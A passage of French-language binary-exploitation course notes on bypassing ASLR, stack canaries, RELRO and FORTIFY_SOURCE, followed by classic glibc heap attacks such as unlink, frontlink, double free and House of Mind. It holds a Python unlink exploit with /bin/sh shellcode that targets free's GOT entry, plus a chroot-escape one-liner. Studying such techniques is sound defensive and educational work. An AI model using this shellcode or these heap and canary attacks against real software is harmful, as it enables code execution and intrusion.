La pile ‚Äî> 24 bits, delta\_stack ‚Äî> R√©ellement 11 (du 10√®me au 20√®me octet inclus) ‚Äî> align√© sur 16 octets ‚Äî> 524 288 adresses r√©elles possibles de la pile

Les variables d'environnement et les arguments se d√©placent moins qu'un tampon dans la pile.

**Return-into-printf**

C'est une technique pour transformer un d√©bordement de tampon en une erreur de cha√Æne de format. Il consiste √† remplacer l'EIP pour qu'il pointe vers un printf de la fonction et √† lui passer en argument une cha√Æne de format manipul√©e pour obtenir des valeurs sur l'√©tat du processus.

**Attaque sur les biblioth√®ques**

Les biblioth√®ques sont √† une position avec 16 bits d'al√©atoire = 65 636 adresses possibles. Si un serveur vuln√©rable appelle fork(), l'espace d'adressage m√©moire est clon√© dans le processus enfant et reste intact. Ainsi, il est possible d'essayer de forcer la fonction usleep() de libc en lui passant l'argument "16" de sorte que si elle met plus de temps que d'habitude √† r√©pondre, la fonction est trouv√©e. En connaissant l'emplacement de cette fonction, il est possible d'obtenir delta\_mmap et de calculer les autres.

La seule fa√ßon d'√™tre s√ªr que l'ASLR fonctionne est d'utiliser une architecture 64 bits. Il n'y a pas d'attaques par force brute.

**StackGuard et StackShield**

**StackGuard** ins√®re avant l'EIP ‚Äî> 0x000aff0d(null, \n, FinDeFichier(EOF), \r) ‚Äî> Restent vuln√©rables recv(), memcpy(), read(), bcopy() et ne prot√®ge pas l'EBP

**StackShield** est plus √©labor√© que StackGuard

Il enregistre dans une table (Global Return Stack) toutes les adresses EIP de retour afin que le d√©bordement ne cause aucun dommage. De plus, les deux adresses peuvent √™tre compar√©es pour voir s'il y a eu un d√©bordement.

Il est √©galement possible de v√©rifier l'adresse de retour avec une valeur limite, ainsi si l'EIP va √† un endroit diff√©rent du normal comme l'espace de donn√©es, on le saura. Mais cela peut √™tre contourn√© avec Ret-to-lib, ROPs ou ret2ret.

Comme on peut le voir, StackShield ne prot√®ge pas non plus les variables locales.

**Stack Smash Protector (ProPolice) -fstack-protector**

Le canary est plac√© avant l'EBP. Il r√©organise les variables locales pour que les tampons soient aux positions les plus √©lev√©es et ne puissent pas √©craser d'autres variables.

De plus, il effectue une copie s√©curis√©e des arguments pass√©s au-dessus de la pile (au-dessus des variables locales) et utilise ces copies comme arguments.

Il ne peut pas prot√©ger les tableaux de moins de 8 √©l√©ments ni les tampons faisant partie d'une structure utilisateur.

Le canary est un nombre al√©atoire extrait de "/dev/urandom" ou sinon c'est 0xff0a0000. Il est stock√© dans TLS (Thread Local Storage). Les threads partagent le m√™me espace m√©moire, le TLS est une zone qui contient des variables globales ou statiques de chaque thread. Cependant, en principe, celles-ci sont copi√©es du processus parent bien que le processus enfant puisse modifier ces donn√©es sans modifier celles du parent ni celles des autres enfants. Le probl√®me est que si fork() est utilis√© mais qu'aucun nouveau canary n'est cr√©√©, alors tous les processus (parent et enfants) utilisent le m√™me canary. En i386, il est stock√© dans gs:0x14 et en x86\_64, il est stock√© dans fs:0x28

Cette protection identifie les fonctions ayant des tampons pouvant √™tre attaqu√©s et inclut au d√©but de la fonction du code pour placer le canary et √† la fin pour le v√©rifier.

La fonction fork() cr√©e une copie exacte du processus parent, c'est pourquoi si un serveur web appelle fork(), une attaque par force brute byte par byte peut √™tre r√©alis√©e pour d√©couvrir le canary utilis√©.

Si la fonction execve() est utilis√©e apr√®s fork(), l'espace est √©cras√© et l'attaque n'est plus possible. vfork() permet d'ex√©cuter le processus enfant sans cr√©er de doublon jusqu'√† ce que le processus enfant tente d'√©crire, alors un doublon est cr√©√©.

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Read only Relocation)** affecte les autorisations de m√©moire de mani√®re similaire √† NX. La diff√©rence est que tandis qu'avec NX, la pile est rendue ex√©cutable, RELRO rend **certaines choses en lecture seule** afin que nous ne puissions pas y √©crire. La mani√®re la plus courante dont j'ai vu cela poser un obstacle est en nous emp√™chant de faire un **√©crasement de table `got`**, qui sera abord√© plus tard. La table `got` contient les adresses des fonctions libc pour que le binaire sache quelles sont les adresses et puisse les appeler. Voyons √† quoi ressemblent les autorisations de m√©moire pour une entr√©e de table `got` pour un binaire avec et sans relro.

Avec relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sans relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Pour le binaire **sans relro**, on peut voir que l'adresse d'entr√©e `got` pour `fgets` est `0x404018`. En regardant les mappings m√©moire, on voit qu'elle se situe entre `0x404000` et `0x405000`, avec les **permissions `rw`**, ce qui signifie que l'on peut lire et √©crire dedans. Pour le binaire **avec relro**, on voit que l'adresse de la table `got` pour l'ex√©cution du binaire (pie est activ√© donc cette adresse changera) est `0x555555557fd0`. Dans le mapping m√©moire de ce binaire, elle se situe entre `0x0000555555557000` et `0x0000555555558000`, avec la permission m√©moire **`r`**, ce qui signifie que l'on peut seulement lire dedans.

Alors, quel est le **contournement** ? Le contournement typique que j'utilise est simplement de ne pas √©crire dans les r√©gions m√©moire que relro rend en lecture seule, et de **trouver un autre moyen d'obtenir l'ex√©cution du code**.

Notez que pour que cela se produise, le binaire doit conna√Ætre avant l'ex√©cution les adresses des fonctions :

* Liaison paresseuse : L'adresse d'une fonction est recherch√©e la premi√®re fois que la fonction est appel√©e. Ainsi, la GOT doit avoir des permissions d'√©criture pendant l'ex√©cution.
* Liaison imm√©diate : Les adresses des fonctions sont r√©solues au d√©but de l'ex√©cution, puis des permissions en lecture seule sont donn√©es aux sections sensibles comme .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Pour v√©rifier si un programme utilise la liaison imm√©diate, vous pouvez faire :
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando le binaire est charg√© en m√©moire et qu'une fonction est appel√©e pour la premi√®re fois, il saute √† la PLT (Procedure Linkage Table), puis effectue un saut (jmp) vers la GOT et d√©couvre que cette entr√©e n'a pas √©t√© r√©solue (elle contient une adresse suivante de la PLT). Il invoque alors le Runtime Linker ou rtfd pour r√©soudre l'adresse et la stocker dans la GOT.

Lorsqu'une fonction est appel√©e, la PLT est appel√©e, elle contient l'adresse de la GOT o√π l'adresse de la fonction est stock√©e, redirigeant ainsi le flux l√†-bas pour appeler la fonction. Cependant, si c'est la premi√®re fois que la fonction est appel√©e, ce qui se trouve dans la GOT est l'instruction suivante de la PLT, donc le flux suit le code de la PLT (rtfd) et d√©couvre l'adresse de la fonction, la stocke dans la GOT et l'appelle.

Lors du chargement d'un binaire en m√©moire, le compilateur lui a indiqu√© √† quel d√©calage il doit placer les donn√©es √† charger lors de l'ex√©cution du programme.

Lazy binding ‚Äî> L'adresse de la fonction est recherch√©e la premi√®re fois que cette fonction est appel√©e, donc la GOT a des autorisations d'√©criture pour que lors de la recherche, elle soit stock√©e l√† et qu'il ne soit pas n√©cessaire de la rechercher √† nouveau.

Bind now ‚Äî> Les adresses des fonctions sont recherch√©es lors du chargement du programme et les autorisations des sections .got, .dtors, .ctors, .dynamic, .jcr sont chang√©es en lecture seule. **-z relro** et **-z now**

Malgr√© cela, en g√©n√©ral, les programmes ne sont pas compliqu√©s avec ces options, donc ces attaques restent possibles.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** ‚Äî> Pour savoir s'ils utilisent le BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 ou =2**

Essaie d'identifier les fonctions qui copient d'un endroit √† un autre de mani√®re non s√©curis√©e et remplace la fonction par une fonction s√©curis√©e.

Par exemple :\
char buf\[16];\
strcpy(but, source);

Il l'identifie comme non s√©curis√©, puis remplace strcpy() par \_\_strcpy\_chk() en utilisant la taille du tampon comme taille maximale √† copier.

La diff√©rence entre **=1** ou **=2** est que :

Le deuxi√®me ne permet pas que **%n** vienne d'une section avec des autorisations d'√©criture. De plus, le param√®tre pour l'acc√®s direct aux arguments ne peut √™tre utilis√© que si les pr√©c√©dents sont utilis√©s, c'est-√†-dire, on ne peut utiliser **%3$d** que si **%2$d** et **%1$d** ont √©t√© utilis√©s auparavant.

Pour afficher le message d'erreur, on utilise argv\[0\], donc si on y met l'adresse d'un autre endroit (comme une variable globale), le message d'erreur affichera le contenu de cette variable. Page 191

**Remplacement de Libsafe**

Il est activ√© avec : LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Il intercepte les appels √† certaines fonctions non s√©curis√©es par d'autres s√©curis√©es. Ce n'est pas standardis√©. (uniquement pour x86, pas pour les compilations avec -fomit-frame-pointer, pas de compilations statiques, toutes les fonctions vuln√©rables ne deviennent pas s√©curis√©es et LD\_PRELOAD ne fonctionne pas avec les binaires suid).

**Espace d'adressage ASCII blind√©**

Consiste √† charger les biblioth√®ques partag√©es de 0x00000000 √† 0x00ffffff pour qu'il y ait toujours un octet 0x00. Cependant, cela ne stoppe pratiquement aucune attaque, surtout en little endian.

**ret2plt**

Consiste √† r√©aliser un ROP de mani√®re √† appeler la fonction strcpy@plt (de la plt) et √† pointer vers l'entr√©e de la GOT et √† copier le premier octet de la fonction √† laquelle on veut appeler (system()). Ensuite, on fait de m√™me en pointant vers GOT+1 et en copiant le 2√®me octet de system()... Enfin, on appelle l'adresse stock√©e dans la GOT qui sera system()

**Faux EBP**

Pour les fonctions qui utilisent l'EBP comme registre pour pointer vers les arguments en modifiant l'EIP et en pointant vers system(), l'EBP doit √©galement avoir √©t√© modifi√© pour pointer vers une zone m√©moire contenant 2 octets quelconques, puis l'adresse de &"/bin/sh".

**Cages avec chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installe un syst√®me de base dans un sous-r√©pertoire sp√©cifique

Un administrateur peut sortir de l'une de ces cages en faisant : mkdir foo; chroot foo; cd ..

**Instrumentation de code**

Valgrind ‚Äî> Recherche d'erreurs\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 D√©bordements de la pile : Exploits de base**

**Chunk allou√©**

prev\_size |\
size | ‚ÄîEn-t√™te\
\*mem | Donn√©es

**Chunk libre**

prev\_size |\
size |\
\*fd | Ptr chunk suivant\
\*bk | Ptr chunk pr√©c√©dent ‚ÄîEn-t√™te\
\*mem | Donn√©es

Les chunks libres sont dans une liste doublement cha√Æn√©e (bin) et il ne peut jamais y avoir deux chunks libres cons√©cutifs (ils sont fusionn√©s).

Dans "size", il y a des bits pour indiquer : si le chunk pr√©c√©dent est utilis√©, si le chunk a √©t√© allou√© via mmap() et si le chunk appartient √† l'arena principal.

Lorsqu'un chunk est lib√©r√© et que des chunks contigus sont libres, ils sont fusionn√©s √† l'aide de la macro unlink() et le nouveau chunk le plus grand est pass√© √† frontlink() pour qu'il soit ins√©r√© dans le bon bin.

unlink(){\
BK = P->bk; ‚Äî> Le BK du nouveau chunk est celui du chunk qui √©tait d√©j√† libre avant\
FD = P->fd; ‚Äî> Le FD du nouveau chunk est celui du chunk qui √©tait d√©j√† libre avant\
FD->bk = BK; ‚Äî> Le BK du chunk suivant pointe vers le nouveau chunk\
BK->fd = FD; ‚Äî> Le FD du chunk pr√©c√©dent pointe vers le nouveau chunk\
}

Par cons√©quent, si nous parvenons √† modifier P->bk avec l'adresse d'un shellcode et P->fd avec l'adresse d'une entr√©e dans la GOT ou DTORS moins 12, nous obtenons :

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Et ainsi, lorsque le programme se termine, le shellcode est ex√©cut√©.

De plus, la 4√®me instruction de unlink() √©crit quelque chose et le shellcode doit √™tre ajust√© pour cela :

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Cela provoque l'√©criture de 4 octets √† partir du 8√®me octet du shellcode, donc la premi√®re instruction du shellcode doit √™tre un jmp pour sauter cela et atteindre des nops qui m√®nent au reste du shellcode.

Ainsi, l'exploit est cr√©√© :

Dans le buffer1, nous mettons le shellcode en commen√ßant par un jmp pour qu'il tombe sur les nops ou sur le reste du shellcode.

Apr√®s le shellcode, nous ajoutons du rembourrage jusqu'√† atteindre le champ prev\_size et size du chunk suivant. √Ä ces endroits, nous mettons 0xfffffff0 (pour √©craser prev\_size pour qu'il ait le bit indiquant qu'il est libre) et "-4" (0xfffffffc) dans size (pour que lors de la v√©rification du 3√®me chunk si le 2√®me √©tait libre, en r√©alit√© il ira au prev\_size modifi√© qui lui dira qu'il est libre) -> Ainsi, lorsque free() enqu√™te, il ira au size du 3√®me mais en r√©alit√© ira au 2√®me - 4 et pensera que le 2√®me chunk est libre. Ensuite, il appelle **unlink()**.

En appelant unlink(), il utilisera les premi√®res donn√©es du 2√®me chunk, donc c'est l√† que l'adresse que l'on veut √©craser - 12 (car dans FD->bk, il ajoutera 12 √† l'adresse stock√©e dans FD) sera ins√©r√©e. Et √† cette adresse, on ins√®re la deuxi√®me adresse trouv√©e dans le 2√®me chunk, qui doit √™tre l'adresse du shellcode (faux P->bk).

**from struct import \***

**import os**

shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de rembourrage

shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\

"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\

"\x80\xe8\xdc\xff\xff\xff/bin/sh";

prev\_size = pack("\<I‚Äù, 0xfffffff0) #Il est important que le bit indiquant que le chunk pr√©c√©dent est libre soit √† 1

fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, pour que le 3√®me chunk pense que le 2√®me est libre

addr\_sc = pack("\<I", 0x0804a008 + 8) #Dans la charge utile, nous commen√ßons par 8 octets de rembourrage

got\_free = pack("\<I", 0x08048300 - 12) #Adresse de free() dans la plt-12 (sera l'adresse √©cras√©e pour lancer le shellcode la 2√®me fois que free est appel√©)

payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Comme mentionn√©, la charge utile commence par 8 octets de rembourrage

payload += prev\_size + fake\_size + got\_free + addr\_sc #Le 2√®me chunk est modifi√©, got\_free pointe l√† o√π nous allons stocker l'adresse addr\_sc + 12

os.system("./8.3.o " + payload)

unset() en lib√©rant dans le sens inverse (wargame)

Nous contr√¥lons 3 chunks cons√©cutifs et ils sont lib√©r√©s dans l'ordre inverse de la r√©servation.

Dans ce cas :

Dans le chunk c, on place le shellcode

Le chunk a est utilis√© pour √©craser le b de mani√®re √† ce que le size ait le bit PREV\_INUSE d√©sactiv√©, de sorte qu'il pense que le chunk a est libre.

De plus, dans l'en-t√™te b, le size est √©cras√© pour qu'il soit √©gal √† -4.

Ainsi, le programme pensera que "a" est libre et dans un bin, donc il appellera unlink() pour le d√©tacher. Cependant, comme l'en-t√™te PREV\_SIZE vaut -4, il pensera que le chunk "a" commence en b+4. Autrement dit, il fera un unlink() √† un chunk qui commence en b+4, donc √† b+12, il y aura le pointeur "fd" et √† b+16, il y aura le pointeur "bk".

De cette mani√®re, si nous mettons l'adresse du shellcode dans bk et l'adresse de la fonction "puts()" -12 dans fd, nous avons notre charge utile.

**Technique de Frontlink**

Frontlink est appel√© lorsqu'un √©l√©ment est lib√©r√© et aucun de ses chunks adjacents n'est libre, unlink() n'est pas appel√© mais frontlink() est appel√© directement.

Vuln√©rabilit√© utile lorsque le malloc attaqu√© n'est jamais lib√©r√© (free()).

N√©cessite :

Un tampon qui peut √™tre d√©bord√© avec la fonction de saisie de donn√©es

Un tampon contigu √† celui-ci qui doit √™tre lib√©r√© et dont le champ fd de son en-t√™te peut √™tre modifi√© gr√¢ce au d√©bordement du tampon pr√©c√©dent

Un tampon √† lib√©rer avec une taille sup√©rieure √† 512 mais inf√©rieure au tampon pr√©c√©dent

Un tampon d√©clar√© avant l'√©tape 3 qui permet de modifier le prev\_size de celui-ci

De cette mani√®re, en modifiant deux malloc de mani√®re incontr√¥l√©e et un de mani√®re contr√¥l√©e mais qui n'est lib√©r√© qu'une seule fois, nous pouvons cr√©er un exploit.

**Vuln√©rabilit√© double free()**

Si free() est appel√© deux fois avec le m√™me pointeur, deux bins pointent vers la m√™me adresse.

Si l'on veut r√©utiliser l'un, il sera attribu√© sans probl√®me. Si l'on veut utiliser l'autre, il sera attribu√© √† la m√™me adresse, ce qui signifie que les pointeurs "fd" et "bk" sont falsifi√©s avec les donn√©es √©crites par la r√©servation pr√©c√©dente.

**After free()**

Un pointeur pr√©c√©demment lib√©r√© est r√©utilis√© sans contr√¥le.

## **8 D√©bordements de la pile : Exploits avanc√©s**

Les techniques Unlink() et FrontLink() ont √©t√© supprim√©es en modifiant la fonction unlink().

**The house of mind**

Une seule appel √† free() est n√©cessaire pour provoquer l'ex√©cution de code arbitraire. Il est important de rechercher un deuxi√®me chunk qui peut √™tre d√©bord√© par un premier et lib√©r√©.

Un appel √† free() appelle public\_fREe(mem), qui fait :

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Renvoie un pointeur vers l'adresse o√π commence le chunk (mem-8)

‚Ä¶

ar\_ptr = arena\_for_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

Dans \[1], il v√©rifie le champ size du bit NON\_MAIN\_ARENA, que l'on peut alt√©rer pour que la v√©rification renvoie true et ex√©cute heap\_for\_ptr() qui effectue un "et" √† "mem" en laissant les 2,5 octets les moins importants √† 0 (dans notre cas, de 0x0804a000, il laisse 0x08000000) et acc√®de √† 0x08000000->ar\_ptr (comme s'il s'agissait d'une structure heap\_info).

De cette mani√®re, si nous pouvons contr√¥ler un chunk, par exemple √† 0x0804a000 et qu'un chunk sera lib√©r√© √† **0x081002a0**, nous pouvons atteindre l'adresse 0x08100000 et √©crire ce que nous voulons, par exemple **0x0804a000**. Lorsque ce deuxi√®me chunk est lib√©r√©, il constatera que heap\_for\_ptr(ptr)->ar\_ptr renvoie ce que nous avons √©crit √† 0x08100000 (car il applique √† 0x081002a0 le "et" que nous avons vu auparavant et en tire la valeur des 4 premiers octets, l'ar\_ptr).

De cette mani√®re, si nous pouvons contr√¥ler un chunk, par exemple √† 0x0804a000 et qu'un chunk sera lib√©r√© √† **0x081002a0**\
**\_int\_free(ar\_ptr, mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Comme nous l'avons vu pr√©c√©demment, nous pouvons contr√¥ler la valeur de av, car c'est ce que nous √©crivons dans le chunk qui sera lib√©r√©.

Tel que d√©fini unsorted\_chunks, nous savons que :\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Par cons√©quent, si nous √©crivons av->bins\[2] la valeur de \_\_DTOR\_END\_\_-12, √† la derni√®re instruction, elle sera √©crite √† \_\_DTOR\_END\_\_.\
C'est-√†-dire, dans le premier chunk, nous devons mettre au d√©but de nombreuses fois l'adresse de \_\_DTOR\_END\_\_-12, car av->bins\[2\] le prendra de l√†.

√Ä l'adresse o√π tombera l'adresse du deuxi√®me chunk avec les 5 derniers z√©ros, nous devons √©crire l'adresse de ce premier chunk pour que heap\_for\_ptr() pense que l'ar\_ptr est au d√©but du premier chunk et tire av->bins\[2\].

Dans le deuxi√®me chunk et gr√¢ce au premier, nous √©crivons prev\_size avec un jump 0x0c et size avec quelque chose pour activer -> NON\_MAIN\_ARENA.

Ensuite, dans le deuxi√®me chunk, nous mettons beaucoup de nops au d√©but et enfin le shellcode.

De cette mani√®re, **\_int\_free(ar\_ptr, mem)** sera appel√©, c'est-√†-dire **\_int\_free(0x0804a000
